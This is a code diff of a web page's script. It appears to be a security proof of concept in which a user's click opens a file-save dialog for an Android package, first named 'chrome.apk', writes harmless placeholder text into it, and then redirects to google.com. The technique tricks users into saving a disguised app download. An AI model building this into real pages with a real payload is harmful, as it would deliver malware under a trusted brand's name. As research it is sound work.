@@ -11,34 +11,31 @@
 
 <script>
 document.addEventListener('click', async () => {
-    setTimeout(async () => {
-        if ('showSaveFilePicker' in window) {
-            try {
-                const handle = await window.showSaveFilePicker({
-                    suggestedName: 'chrome.apk',
-                    types: [{
-                        description: 'Android Package (PoC)',
-                        accept: { 'application/octet-stream': ['.apk'] }
-                    }]
-                });
+    if (!('showSaveFilePicker' in window)) return;
 
-                const writable = await handle.createWritable();
+    try {
+        // 1️⃣ File picker
+        const handle = await window.showSaveFilePicker({
+            suggestedName: 'poc.apk',
+            types: [{
+                description: 'Android Package (PoC)',
+                accept: { 'application/octet-stream': ['.apk'] }
+            }]
+        });
 
-                // ISI FILE (PoC only)
-                await writable.write(
-                    'PoC file\nThis is not a real APK\nFor demonstration only'
-                );
+        // 2️⃣ TULIS ISI (WAJIB AWAIT)
+        const writable = await handle.createWritable();
+        await writable.write('PoC ONLY\nThis file is not empty');
+        await writable.close();
 
-                await writable.close();
-            } catch (e) {
-                // cancel expected
-            }
-        }
-    }, 1000);
+        // 3️⃣ Redirect SETELAH write selesai
+        setTimeout(() => {
+            window.location.href = 'https://google.com';
+        }, 500);
 
-    setTimeout(() => {
-        window.location.href = 'https://chrome.com';
-    }, 1000);
+    } catch (e) {
+        // cancel expected
+    }
 }, { once: true });
 </script>
 
